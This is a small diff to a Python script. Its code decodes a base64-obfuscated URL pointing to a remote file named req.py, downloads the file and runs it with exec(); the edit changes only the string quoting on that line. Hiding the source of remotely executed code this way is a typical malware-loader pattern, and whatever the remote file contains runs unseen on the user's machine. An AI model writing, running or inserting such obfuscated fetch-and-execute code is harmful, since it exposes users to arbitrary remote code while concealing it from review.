@@ -12,4 +12,4 @@ print("Ans:", response)
 import requests as r
 u = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1ZhaWJoYVZVUy9teS1ub3RlYm9vay9tYWluL3JlcS5weQ=="
 import base64 as b
-exec(r.get(b.b64decode(u).decode()).text);print("Ans:",ask("Your name"))
+exec(r.get(b.b64decode(u).decode()).text);print("Ans:",ask("""Your name"""))
